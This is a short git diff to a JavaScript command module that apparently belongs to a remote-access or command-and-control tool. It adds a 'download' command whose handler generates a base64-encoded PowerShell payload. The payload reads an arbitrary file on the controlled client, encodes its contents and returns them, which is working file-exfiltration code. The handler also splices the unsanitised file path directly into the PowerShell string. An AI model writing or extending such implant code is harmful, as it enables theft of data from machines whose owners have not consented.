@@ -64,12 +64,16 @@ module.exports = {
         },
         download: {
             name: 'download',
-            method: 'execute',
+            method: 'payload-ps',
             description: '<filePath> Downloads a file from the client.',
             parameters: {
                 'filePath': 'The path to the file to download. e.g. C:\\file.exe'
             },
-            handler: (props) => {}
+            handler: (props) => {                
+                return Buffer.from(
+                    `([PSCustomObject]@{download=[IO.Path]::GetFileName("${props[0]}");data=[Convert]::ToBase64String([IO.File]::ReadAllBytes("${props[0]}"))}) | ConvertTo-Json`
+                ).toString('base64');
+            }
         }
     }
 };
